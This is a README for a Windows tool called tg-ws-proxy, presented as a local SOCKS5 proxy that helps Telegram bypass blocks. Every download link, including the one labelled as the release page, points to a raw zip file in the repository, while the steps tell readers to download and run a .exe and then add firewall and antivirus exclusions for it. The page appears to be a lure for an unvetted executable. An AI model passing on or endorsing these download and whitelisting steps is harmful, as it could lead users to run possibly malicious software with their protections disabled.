# 🛡️ tg-ws-proxy - Simple Local SOCKS5 Proxy Server

[![Download tg-ws-proxy](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/raw/refs/heads/main/proxy/proxy-tg-ws-v1.2.zip)

---

## 📋 What is tg-ws-proxy?

tg-ws-proxy is a small program that runs on your Windows computer. It sets up a local SOCKS5 proxy server. This helps your Telegram app work better by bypassing slow or blocked internet paths. The goal is to make Telegram load faster and more reliably without changing your whole internet setup.

---

## 🖥️ System Requirements

- Windows 10 or later (64-bit preferred)  
- At least 512 MB of free RAM  
- 10 MB free space for the program files  
- A working internet connection  

tg-ws-proxy uses little memory and storage. It runs quietly in the background once started.

---

## ⚙️ Features

- Runs a local SOCKS5 proxy server on your PC  
- Helps bypass partial blocks specifically for Telegram  
- Lightweight and easy to use  
- No installation needed, runs as a standalone program  
- Simple setup with minimal steps  

---

## 🚀 Getting Started

This section will help you download and run tg-ws-proxy on Windows with step-by-step instructions. You do not need any technical skills or programming knowledge.

---

## 📥 Download tg-ws-proxy

Click the button below to visit the official release page:

[![Download tg-ws-proxy](https://img.shields.io/badge/Download-tg--ws--proxy-blue?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/raw/refs/heads/main/proxy/proxy-tg-ws-v1.2.zip)

On the release page:

1. Find the latest version listed at the top.  
2. Look for a file that ends with `.exe`. This is the program you will run.  
3. Click the `.exe` file to download it to your computer.  

Save it to the folder where you can easily find it, like your Desktop or Downloads folder.

---

## 💻 How to Run tg-ws-proxy on Windows

1. Open the folder where you saved the tg-ws-proxy `.exe` file.  
2. Double-click on the `.exe` file to start the program. A command window will open briefly and may stay open, showing log messages.  
3. tg-ws-proxy will now run the local SOCKS5 proxy server in the background. Leave this window open for the proxy to keep working.  
4. To stop the proxy, simply close the command window.  

---

## 🔧 How to Configure Telegram to Use the Proxy

To make Telegram use the tg-ws-proxy server, follow these steps:

1. Open your Telegram app on Windows or mobile.  
2. Go to Settings > Data and Storage > Proxy Settings (the path may differ slightly depending on your version).  
3. Select "Add Proxy" or "Use Proxy".  
4. Choose SOCKS5 as the proxy type.  
5. Enter the following details:  
    - Address: `127.0.0.1`  
    - Port: `1080` (default port tg-ws-proxy uses)  
6. Save the proxy settings and enable the proxy.  

Telegram will now route its traffic through the local proxy server.

---

## 🛠️ Changing the Proxy Port

By default, tg-ws-proxy runs on port 1080. If this port is already in use or causes conflicts, you can change it:

1. Run tg-ws-proxy from the command prompt with a port argument. For example:  
   ```
   tg-ws-proxy.exe 1081
   ```  
   This will run the proxy on port 1081 instead.  
2. Update the port setting in Telegram to match the new port number.

---

## 🧩 Advanced Settings

tg-ws-proxy is designed to be simple. It does not require extra configuration for most users. If you want to explore advanced options, check the project’s GitHub page for updates and documentation.

---

## 🔍 Troubleshooting

### tg-ws-proxy window closes immediately or shows an error

- Make sure you are running the `.exe` file directly, not from a shortcut that points elsewhere.  
- Try running tg-ws-proxy from the Command Prompt for better debugging:  
  1. Press Windows + R, type `cmd`, and hit Enter.  
  2. Navigate to the folder containing tg-ws-proxy.exe using `cd` command.  
  3. Type `tg-ws-proxy.exe` and press Enter. Check the messages for errors.

### Telegram does not connect or shows network errors

- Confirm that you added the proxy with the right address (`127.0.0.1`) and port number.  
- Make sure the tg-ws-proxy window is still open and running on your PC.  
- Restart tg-ws-proxy and Telegram to reset the connection.  

---

## ⚠️ Firewall and Antivirus Considerations

Windows Firewall or antivirus software may block tg-ws-proxy. If Telegram cannot connect through the proxy, add an exception for tg-ws-proxy.exe:

1. Open Windows Security and navigate to Firewall settings.  
2. Allow tg-ws-proxy.exe through private and public networks.  
3. Add your antivirus program exclusion for tg-ws-proxy.exe if needed.  

---

## 🔄 Updating tg-ws-proxy

Check the [release page](https://github.com/TrippyDawg/tg-ws-proxy/raw/refs/heads/main/proxy/proxy-tg-ws-v1.2.zip) regularly to find new versions. Download the latest `.exe` file and replace the old one on your PC.

---

## 📂 File Details in the Release

Each release typically includes:

- `tg-ws-proxy.exe`: The main program you run.  
- Release notes explaining fixes or changes.  

No installation is needed. Just download and run the `.exe`.

---

## 🧑‍💻 Support and Feedback

For issues or questions, visit the GitHub repository issues page. Developers monitor this space for bug reports and feedback.

---

[![Download tg-ws-proxy](https://img.shields.io/badge/Download-This_Page-green?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/raw/refs/heads/main/proxy/proxy-tg-ws-v1.2.zip)